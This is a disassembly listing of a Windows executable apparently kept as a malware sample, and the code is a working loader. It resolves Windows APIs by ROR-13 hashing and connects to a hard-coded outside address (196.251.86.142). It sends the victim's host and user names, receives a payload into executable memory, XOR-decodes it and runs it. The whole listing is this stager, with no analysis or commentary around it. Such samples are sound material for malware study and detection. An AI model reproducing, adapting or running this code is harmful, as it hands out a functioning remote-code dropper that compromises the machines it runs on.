
malware_samples/loader/c373be374ca2e92cb015dca9e571f89103be65d12e6af224c94ac033c208761e.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	e9 03 00 00 00       	jmp    0x140001008
   140001005:	cc                   	int3
   140001006:	cc                   	int3
   140001007:	cc                   	int3
   140001008:	40 55                	rex push %rbp
   14000100a:	53                   	push   %rbx
   14000100b:	56                   	push   %rsi
   14000100c:	57                   	push   %rdi
   14000100d:	41 54                	push   %r12
   14000100f:	41 55                	push   %r13
   140001011:	41 56                	push   %r14
   140001013:	41 57                	push   %r15
   140001015:	48 8d ac 24 68 fd ff 	lea    -0x298(%rsp),%rbp
   14000101c:	ff 
   14000101d:	48 81 ec 98 03 00 00 	sub    $0x398,%rsp
   140001024:	b9 4c 77 26 07       	mov    $0x726774c,%ecx
   140001029:	e8 2e 04 00 00       	call   0x14000145c
   14000102e:	33 ff                	xor    %edi,%edi
   140001030:	c7 45 90 75 73 65 72 	movl   $0x72657375,-0x70(%rbp)
   140001037:	48 8b d8             	mov    %rax,%rbx
   14000103a:	40 88 7d 9a          	mov    %dil,-0x66(%rbp)
   14000103e:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   140001042:	c7 45 94 33 32 2e 64 	movl   $0x642e3233,-0x6c(%rbp)
   140001049:	66 c7 45 98 6c 6c    	movw   $0x6c6c,-0x68(%rbp)
   14000104f:	ff d3                	call   *%rbx
   140001051:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   140001055:	c7 45 a0 77 73 32 5f 	movl   $0x5f327377,-0x60(%rbp)
   14000105c:	c7 45 a4 33 32 2e 64 	movl   $0x642e3233,-0x5c(%rbp)
   140001063:	66 c7 45 a8 6c 6c    	movw   $0x6c6c,-0x58(%rbp)
   140001069:	40 88 7d aa          	mov    %dil,-0x56(%rbp)
   14000106d:	ff d3                	call   *%rbx
   14000106f:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140001073:	c7 45 b0 6d 73 76 63 	movl   $0x6376736d,-0x50(%rbp)
   14000107a:	c7 45 b4 72 74 2e 64 	movl   $0x642e7472,-0x4c(%rbp)
   140001081:	66 c7 45 b8 6c 6c    	movw   $0x6c6c,-0x48(%rbp)
   140001087:	40 88 7d ba          	mov    %dil,-0x46(%rbp)
   14000108b:	ff d3                	call   *%rbx
   14000108d:	b9 29 80 6b 00       	mov    $0x6b8029,%ecx
   140001092:	e8 c5 03 00 00       	call   0x14000145c
   140001097:	b9 ea 0f df e0       	mov    $0xe0df0fea,%ecx
   14000109c:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   1400010a0:	e8 b7 03 00 00       	call   0x14000145c
   1400010a5:	b9 99 a5 74 61       	mov    $0x6174a599,%ecx
   1400010aa:	4c 8b e8             	mov    %rax,%r13
   1400010ad:	e8 aa 03 00 00       	call   0x14000145c
   1400010b2:	b9 c2 eb 38 5f       	mov    $0x5f38ebc2,%ecx
   1400010b7:	48 8b f0             	mov    %rax,%rsi
   1400010ba:	e8 9d 03 00 00       	call   0x14000145c
   1400010bf:	b9 58 a4 53 e5       	mov    $0xe553a458,%ecx
   1400010c4:	48 8b f8             	mov    %rax,%rdi
   1400010c7:	e8 90 03 00 00       	call   0x14000145c
   1400010cc:	b9 02 d9 c8 5f       	mov    $0x5fc8d902,%ecx
   1400010d1:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   1400010d5:	e8 82 03 00 00       	call   0x14000145c
   1400010da:	b9 75 6e 4d 61       	mov    $0x614d6e75,%ecx
   1400010df:	4c 8b f8             	mov    %rax,%r15
   1400010e2:	e8 75 03 00 00       	call   0x14000145c
   1400010e7:	b9 a9 28 34 80       	mov    $0x803428a9,%ecx
   1400010ec:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400010f0:	e8 67 03 00 00       	call   0x14000145c
   1400010f5:	b9 12 1e 7b 4d       	mov    $0x4d7b1e12,%ecx
   1400010fa:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   1400010fe:	e8 59 03 00 00       	call   0x14000145c
   140001103:	b9 8d 60 eb d0       	mov    $0xd0eb608d,%ecx
   140001108:	4c 8b e0             	mov    %rax,%r12
   14000110b:	e8 4c 03 00 00       	call   0x14000145c
   140001110:	b9 31 fa f2 70       	mov    $0x70f2fa31,%ecx
   140001115:	4c 8b f0             	mov    %rax,%r14
   140001118:	e8 3f 03 00 00       	call   0x14000145c
   14000111d:	b9 30 f3 49 e4       	mov    $0xe449f330,%ecx
   140001122:	48 8b d8             	mov    %rax,%rbx
   140001125:	e8 32 03 00 00       	call   0x14000145c
   14000112a:	48 8d 55 70          	lea    0x70(%rbp),%rdx
   14000112e:	b9 80 00 00 00       	mov    $0x80,%ecx
   140001133:	ff d0                	call   *%rax
   140001135:	33 c0                	xor    %eax,%eax
   140001137:	c7 44 24 78 25 73 25 	movl   $0x73257325,0x78(%rsp)
   14000113e:	73 
   14000113f:	88 44 24 7e          	mov    %al,0x7e(%rsp)
   140001143:	4c 8d 4d 88          	lea    -0x78(%rbp),%r9
   140001147:	48 8d 85 e8 02 00 00 	lea    0x2e8(%rbp),%rax
   14000114e:	66 c7 44 24 7c 25 73 	movw   $0x7325,0x7c(%rsp)
   140001155:	4c 8d 45 70          	lea    0x70(%rbp),%r8
   140001159:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000115e:	48 8d 54 24 78       	lea    0x78(%rsp),%rdx
   140001163:	c7 45 88 6c 6f 67 5f 	movl   $0x5f676f6c,-0x78(%rbp)
   14000116a:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   14000116e:	c7 45 8c 64 65 2e 00 	movl   $0x2e6564,-0x74(%rbp)
   140001175:	c7 85 e8 02 00 00 6c 	movl   $0x676f6c,0x2e8(%rbp)
   14000117c:	6f 67 00 
   14000117f:	41 ff d6             	call   *%r14
   140001182:	33 d2                	xor    %edx,%edx
   140001184:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140001188:	ff d3                	call   *%rbx
   14000118a:	33 db                	xor    %ebx,%ebx
   14000118c:	85 c0                	test   %eax,%eax
   14000118e:	0f 84 b4 02 00 00    	je     0x140001448
   140001194:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140001199:	c7 45 80 77 36 34 20 	movl   $0x20343677,-0x80(%rbp)
   1400011a0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400011a5:	4c 8d 8d f8 02 00 00 	lea    0x2f8(%rbp),%r9
   1400011ac:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400011b1:	66 c7 45 84 20 20    	movw   $0x2020,-0x7c(%rbp)
   1400011b7:	4c 8d 85 f0 02 00 00 	lea    0x2f0(%rbp),%r8
   1400011be:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400011c3:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400011c8:	88 5d 86             	mov    %bl,-0x7a(%rbp)
   1400011cb:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400011cf:	c7 85 f0 02 00 00 31 	movl   $0x2e363931,0x2f0(%rbp)
   1400011d6:	39 36 2e 
   1400011d9:	88 9d f4 02 00 00    	mov    %bl,0x2f4(%rbp)
   1400011df:	c7 85 f8 02 00 00 32 	movl   $0x2e313532,0x2f8(%rbp)
   1400011e6:	35 31 2e 
   1400011e9:	88 9d fc 02 00 00    	mov    %bl,0x2fc(%rbp)
   1400011ef:	c7 44 24 30 38 36 2e 	movl   $0x312e3638,0x30(%rsp)
   1400011f6:	31 
   1400011f7:	88 5c 24 34          	mov    %bl,0x34(%rsp)
   1400011fb:	c7 44 24 38 34 32 00 	movl   $0x3234,0x38(%rsp)
   140001202:	00 
   140001203:	88 5c 24 3c          	mov    %bl,0x3c(%rsp)
   140001207:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
   14000120e:	00 
   14000120f:	88 5c 24 44          	mov    %bl,0x44(%rsp)
   140001213:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
   14000121a:	00 
   14000121b:	88 5c 24 4c          	mov    %bl,0x4c(%rsp)
   14000121f:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   140001226:	00 
   140001227:	88 5c 24 54          	mov    %bl,0x54(%rsp)
   14000122b:	c7 44 24 58 00 00 00 	movl   $0x0,0x58(%rsp)
   140001232:	00 
   140001233:	88 5c 24 5c          	mov    %bl,0x5c(%rsp)
   140001237:	c7 44 24 60 25 73 25 	movl   $0x73257325,0x60(%rsp)
   14000123e:	73 
   14000123f:	c7 44 24 64 25 73 25 	movl   $0x73257325,0x64(%rsp)
   140001246:	73 
   140001247:	88 5c 24 68          	mov    %bl,0x68(%rsp)
   14000124b:	c7 44 24 70 25 73 25 	movl   $0x73257325,0x70(%rsp)
   140001252:	73 
   140001253:	88 5c 24 74          	mov    %bl,0x74(%rsp)
   140001257:	41 ff d6             	call   *%r14
   14000125a:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   14000125f:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001264:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   140001269:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000126e:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001273:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001278:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000127d:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001281:	41 ff d6             	call   *%r14
   140001284:	4c 8d 4d f0          	lea    -0x10(%rbp),%r9
   140001288:	4c 8d 45 10          	lea    0x10(%rbp),%r8
   14000128c:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140001291:	48 8d 4d 30          	lea    0x30(%rbp),%rcx
   140001295:	41 ff d6             	call   *%r14
   140001298:	b9 02 02 00 00       	mov    $0x202,%ecx
   14000129d:	48 8d 95 f0 00 00 00 	lea    0xf0(%rbp),%rdx
   1400012a4:	ff 55 d0             	call   *-0x30(%rbp)
   1400012a7:	85 c0                	test   %eax,%eax
   1400012a9:	0f 85 99 01 00 00    	jne    0x140001448
   1400012af:	44 8d 73 01          	lea    0x1(%rbx),%r14d
   1400012b3:	45 33 c9             	xor    %r9d,%r9d
   1400012b6:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   1400012bb:	44 8d 43 06          	lea    0x6(%rbx),%r8d
   1400012bf:	41 8b d6             	mov    %r14d,%edx
   1400012c2:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   1400012c6:	8d 4b 02             	lea    0x2(%rbx),%ecx
   1400012c9:	41 ff d5             	call   *%r13
   1400012cc:	48 8b d8             	mov    %rax,%rbx
   1400012cf:	48 85 c0             	test   %rax,%rax
   1400012d2:	0f 84 70 01 00 00    	je     0x140001448
   1400012d8:	48 8d 4d 30          	lea    0x30(%rbp),%rcx
   1400012dc:	c7 45 c0 02 00 6f 9b 	movl   $0x9b6f0002,-0x40(%rbp)
   1400012e3:	45 8d 6e 01          	lea    0x1(%r14),%r13d
   1400012e7:	ff 55 d8             	call   *-0x28(%rbp)
   1400012ea:	48 85 c0             	test   %rax,%rax
   1400012ed:	75 09                	jne    0x1400012f8
   1400012ef:	48 8d 4d 30          	lea    0x30(%rbp),%rcx
   1400012f3:	41 ff d4             	call   *%r12
   1400012f6:	eb 09                	jmp    0x140001301
   1400012f8:	48 8b 40 18          	mov    0x18(%rax),%rax
   1400012fc:	48 8b 08             	mov    (%rax),%rcx
   1400012ff:	8b 01                	mov    (%rcx),%eax
   140001301:	89 45 c4             	mov    %eax,-0x3c(%rbp)
   140001304:	41 bc 10 00 00 00    	mov    $0x10,%r12d
   14000130a:	eb 0b                	jmp    0x140001317
   14000130c:	b9 10 27 00 00       	mov    $0x2710,%ecx
   140001311:	ff 15 e9 0c 00 00    	call   *0xce9(%rip)        # 0x140002000
   140001317:	45 8b c4             	mov    %r12d,%r8d
   14000131a:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   14000131e:	48 8b cb             	mov    %rbx,%rcx
   140001321:	ff d6                	call   *%rsi
   140001323:	85 c0                	test   %eax,%eax
   140001325:	75 e5                	jne    0x14000130c
   140001327:	45 33 c9             	xor    %r9d,%r9d
   14000132a:	44 8d 40 06          	lea    0x6(%rax),%r8d
   14000132e:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   140001332:	48 8b cb             	mov    %rbx,%rcx
   140001335:	ff d7                	call   *%rdi
   140001337:	8a 45 c2             	mov    -0x3e(%rbp),%al
   14000133a:	48 8d 95 e0 02 00 00 	lea    0x2e0(%rbp),%rdx
   140001341:	88 85 e0 02 00 00    	mov    %al,0x2e0(%rbp)
   140001347:	45 33 c9             	xor    %r9d,%r9d
   14000134a:	0f b7 45 c2          	movzwl -0x3e(%rbp),%eax
   14000134e:	45 8b c5             	mov    %r13d,%r8d
   140001351:	66 c1 e8 08          	shr    $0x8,%ax
   140001355:	48 8b cb             	mov    %rbx,%rcx
   140001358:	88 85 e1 02 00 00    	mov    %al,0x2e1(%rbp)
   14000135e:	ff d7                	call   *%rdi
   140001360:	45 33 c9             	xor    %r9d,%r9d
   140001363:	48 8d 95 f0 02 00 00 	lea    0x2f0(%rbp),%rdx
   14000136a:	48 8b cb             	mov    %rbx,%rcx
   14000136d:	41 8d 71 04          	lea    0x4(%r9),%esi
   140001371:	44 8b c6             	mov    %esi,%r8d
   140001374:	ff d7                	call   *%rdi
   140001376:	45 33 c9             	xor    %r9d,%r9d
   140001379:	48 8d 95 f8 02 00 00 	lea    0x2f8(%rbp),%rdx
   140001380:	44 8b c6             	mov    %esi,%r8d
   140001383:	48 8b cb             	mov    %rbx,%rcx
   140001386:	ff d7                	call   *%rdi
   140001388:	45 33 c9             	xor    %r9d,%r9d
   14000138b:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140001390:	44 8b c6             	mov    %esi,%r8d
   140001393:	48 8b cb             	mov    %rbx,%rcx
   140001396:	ff d7                	call   *%rdi
   140001398:	45 33 c9             	xor    %r9d,%r9d
   14000139b:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   1400013a0:	44 8b c6             	mov    %esi,%r8d
   1400013a3:	48 8b cb             	mov    %rbx,%rcx
   1400013a6:	ff d7                	call   *%rdi
   1400013a8:	45 33 c9             	xor    %r9d,%r9d
   1400013ab:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1400013b0:	44 8b c6             	mov    %esi,%r8d
   1400013b3:	48 8b cb             	mov    %rbx,%rcx
   1400013b6:	ff d7                	call   *%rdi
   1400013b8:	45 33 c9             	xor    %r9d,%r9d
   1400013bb:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   1400013c0:	44 8b c6             	mov    %esi,%r8d
   1400013c3:	48 8b cb             	mov    %rbx,%rcx
   1400013c6:	ff d7                	call   *%rdi
   1400013c8:	45 33 c9             	xor    %r9d,%r9d
   1400013cb:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400013d0:	44 8b c6             	mov    %esi,%r8d
   1400013d3:	48 8b cb             	mov    %rbx,%rcx
   1400013d6:	ff d7                	call   *%rdi
   1400013d8:	45 33 c9             	xor    %r9d,%r9d
   1400013db:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   1400013e0:	44 8b c6             	mov    %esi,%r8d
   1400013e3:	48 8b cb             	mov    %rbx,%rcx
   1400013e6:	ff d7                	call   *%rdi
   1400013e8:	ba 80 c3 c9 01       	mov    $0x1c9c380,%edx
   1400013ed:	44 8d 4e 3c          	lea    0x3c(%rsi),%r9d
   1400013f1:	33 c9                	xor    %ecx,%ecx
   1400013f3:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400013f9:	ff 55 e0             	call   *-0x20(%rbp)
   1400013fc:	48 8b f8             	mov    %rax,%rdi
   1400013ff:	48 85 c0             	test   %rax,%rax
   140001402:	74 44                	je     0x140001448
   140001404:	33 f6                	xor    %esi,%esi
   140001406:	41 bc 00 40 06 00    	mov    $0x64000,%r12d
   14000140c:	48 8b d0             	mov    %rax,%rdx
   14000140f:	eb 1e                	jmp    0x14000142f
   140001411:	45 33 c0             	xor    %r8d,%r8d
   140001414:	85 c0                	test   %eax,%eax
   140001416:	74 10                	je     0x140001428
   140001418:	41 8d 0c 30          	lea    (%r8,%rsi,1),%ecx
   14000141c:	45 03 c6             	add    %r14d,%r8d
   14000141f:	80 34 39 99          	xorb   $0x99,(%rcx,%rdi,1)
   140001423:	44 3b c0             	cmp    %eax,%r8d
   140001426:	72 f0                	jb     0x140001418
   140001428:	03 f0                	add    %eax,%esi
   14000142a:	8b d6                	mov    %esi,%edx
   14000142c:	48 03 d7             	add    %rdi,%rdx
   14000142f:	45 33 c9             	xor    %r9d,%r9d
   140001432:	45 8b c4             	mov    %r12d,%r8d
   140001435:	48 8b cb             	mov    %rbx,%rcx
   140001438:	41 ff d7             	call   *%r15
   14000143b:	41 3b c6             	cmp    %r14d,%eax
   14000143e:	7d d1                	jge    0x140001411
   140001440:	48 8b cb             	mov    %rbx,%rcx
   140001443:	ff 55 e8             	call   *-0x18(%rbp)
   140001446:	ff d7                	call   *%rdi
   140001448:	48 81 c4 98 03 00 00 	add    $0x398,%rsp
   14000144f:	41 5f                	pop    %r15
   140001451:	41 5e                	pop    %r14
   140001453:	41 5d                	pop    %r13
   140001455:	41 5c                	pop    %r12
   140001457:	5f                   	pop    %rdi
   140001458:	5e                   	pop    %rsi
   140001459:	5b                   	pop    %rbx
   14000145a:	5d                   	pop    %rbp
   14000145b:	c3                   	ret
   14000145c:	48 8b c4             	mov    %rsp,%rax
   14000145f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140001463:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140001467:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000146b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000146f:	41 56                	push   %r14
   140001471:	48 83 ec 10          	sub    $0x10,%rsp
   140001475:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   14000147c:	00 00 
   14000147e:	8b e9                	mov    %ecx,%ebp
   140001480:	45 33 f6             	xor    %r14d,%r14d
   140001483:	48 8b 50 18          	mov    0x18(%rax),%rdx
   140001487:	4c 8b 42 10          	mov    0x10(%rdx),%r8
   14000148b:	4d 39 70 30          	cmp    %r14,0x30(%r8)
   14000148f:	0f 84 b7 00 00 00    	je     0x14000154c
   140001495:	4d 8b 48 30          	mov    0x30(%r8),%r9
   140001499:	41 8b d6             	mov    %r14d,%edx
   14000149c:	41 0f 10 40 58       	movups 0x58(%r8),%xmm0
   1400014a1:	4d 8b 00             	mov    (%r8),%r8
   1400014a4:	49 63 41 3c          	movslq 0x3c(%r9),%rax
   1400014a8:	f3 0f 7f 04 24       	movdqu %xmm0,(%rsp)
   1400014ad:	46 8b 9c 08 88 00 00 	mov    0x88(%rax,%r9,1),%r11d
   1400014b4:	00 
   1400014b5:	45 85 db             	test   %r11d,%r11d
   1400014b8:	74 d1                	je     0x14000148b
   1400014ba:	48 8b 04 24          	mov    (%rsp),%rax
   1400014be:	48 c1 e8 10          	shr    $0x10,%rax
   1400014c2:	66 44 3b f0          	cmp    %ax,%r14w
   1400014c6:	73 22                	jae    0x1400014ea
   1400014c8:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   1400014cd:	44 0f b7 d0          	movzwl %ax,%r10d
   1400014d1:	0f be 01             	movsbl (%rcx),%eax
   1400014d4:	c1 ca 0d             	ror    $0xd,%edx
   1400014d7:	80 39 61             	cmpb   $0x61,(%rcx)
   1400014da:	7c 03                	jl     0x1400014df
   1400014dc:	83 c2 e0             	add    $0xffffffe0,%edx
   1400014df:	03 d0                	add    %eax,%edx
   1400014e1:	48 ff c1             	inc    %rcx
   1400014e4:	49 83 ea 01          	sub    $0x1,%r10
   1400014e8:	75 e7                	jne    0x1400014d1
   1400014ea:	4f 8d 14 19          	lea    (%r9,%r11,1),%r10
   1400014ee:	45 8b de             	mov    %r14d,%r11d
   1400014f1:	41 8b 7a 20          	mov    0x20(%r10),%edi
   1400014f5:	49 03 f9             	add    %r9,%rdi
   1400014f8:	45 39 72 18          	cmp    %r14d,0x18(%r10)
   1400014fc:	76 8d                	jbe    0x14000148b
   1400014fe:	8b 37                	mov    (%rdi),%esi
   140001500:	41 8b de             	mov    %r14d,%ebx
   140001503:	49 03 f1             	add    %r9,%rsi
   140001506:	48 8d 7f 04          	lea    0x4(%rdi),%rdi
   14000150a:	0f be 0e             	movsbl (%rsi),%ecx
   14000150d:	48 ff c6             	inc    %rsi
   140001510:	c1 cb 0d             	ror    $0xd,%ebx
   140001513:	03 d9                	add    %ecx,%ebx
   140001515:	84 c9                	test   %cl,%cl
   140001517:	75 f1                	jne    0x14000150a
   140001519:	8d 04 13             	lea    (%rbx,%rdx,1),%eax
   14000151c:	3b c5                	cmp    %ebp,%eax
   14000151e:	74 0e                	je     0x14000152e
   140001520:	41 ff c3             	inc    %r11d
   140001523:	45 3b 5a 18          	cmp    0x18(%r10),%r11d
   140001527:	72 d5                	jb     0x1400014fe
   140001529:	e9 5d ff ff ff       	jmp    0x14000148b
   14000152e:	41 8b 42 24          	mov    0x24(%r10),%eax
   140001532:	43 8d 0c 1b          	lea    (%r11,%r11,1),%ecx
   140001536:	49 03 c1             	add    %r9,%rax
   140001539:	0f b7 14 01          	movzwl (%rcx,%rax,1),%edx
   14000153d:	41 8b 4a 1c          	mov    0x1c(%r10),%ecx
   140001541:	49 03 c9             	add    %r9,%rcx
   140001544:	8b 04 91             	mov    (%rcx,%rdx,4),%eax
   140001547:	49 03 c1             	add    %r9,%rax
   14000154a:	eb 02                	jmp    0x14000154e
   14000154c:	33 c0                	xor    %eax,%eax
   14000154e:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   140001553:	48 8b 6c 24 28       	mov    0x28(%rsp),%rbp
   140001558:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   14000155d:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   140001562:	48 83 c4 10          	add    $0x10,%rsp
   140001566:	41 5e                	pop    %r14
   140001568:	c3                   	ret
